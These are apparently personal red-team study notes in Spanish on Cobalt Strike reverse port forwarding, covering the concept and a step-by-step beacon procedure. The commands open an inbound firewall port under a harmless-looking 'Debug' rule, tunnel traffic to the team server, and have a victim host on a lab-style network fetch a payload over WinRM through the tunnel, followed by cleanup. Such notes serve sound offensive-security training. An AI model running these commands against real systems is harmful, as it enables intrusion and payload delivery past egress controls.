
# Reverse Port Forward Cobalt Strike

Permite a un atacante tunelizar tráfico desde dentro hacia el exterior (lo contrario a SOCKS) esto es útil cuando encontramos algún servidor u ordenador que tiene prohibido enviar tráfico a Internet o fuera de su segmento de red.


---

## Concepto

- Le decimos al Beacon que empiece a escuchar en un **bind port** cualquier petición que llegue a este puerto se va a enviar al team server a través del canal C2.
- El team server envía ese tráfico al forward host y forward port.
- Si hay una respuesta, el team server la envía de vuelta al Beacon a través del canal C2.
- Finalmente el Beacon envía la respuesta al peticionario original.

---

## Requisitos / Contexto

- La sintaxis de cobalt utiliza `rportfwd`
- Los argumentos son `rportfwd [bind port] [forward host] [forward port]`
- Se tiene que utilizar esta técnica cuando no podamos enviar tráfico de dentro de la máquina victima al exterior.
- Si tenemos ejecución de comandos en la víctima pero no podemos subir un payload a la máquina. Aprovechamos Poershell download para pedir a la victima que se descargue el apyload de nuestra máquina a través de nuestro tunel.

---

## Procedimiento

No necestiamos ser localadmin para bindearnos a un puerto porque los usuarios normales se pueden bindear a puertos altos (no comunes). El **mayor problema** son las reglas de firewall que existan en el ordenador donde está corriendo el Beacon porque va a bloquear todo el tráfico de entrada por defecto, a no ser que se cree una regla que lo permita y para eso **se necesita admin local**

### 1. Crear Regla Firewall

```bash
# Añadimos una regla en el firewall para permitir el tráfico al puerto 28190
beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
```

### 2. Hacer el port forwarding

```bash
# Comenzamos un reverse port forwarding en ese puerto para que redirija el tráfico al puerto 80 del teamserver (que es localhost)
beacon> rportfwd 28190 localhost 80
```

### 3. Ejecutar el comando deseado

```bash
# Ejecutamos el comando deseado en la víctima
beacon> remote-exec winrm lon-ws-1 iwr http://lon-wkstn-1:28190/test
```

### 4. Limpieza

```bash
beacon> rportfwd stop 28190
beacon> run netsh advfirewall firewall delete rule name="Debug"
```

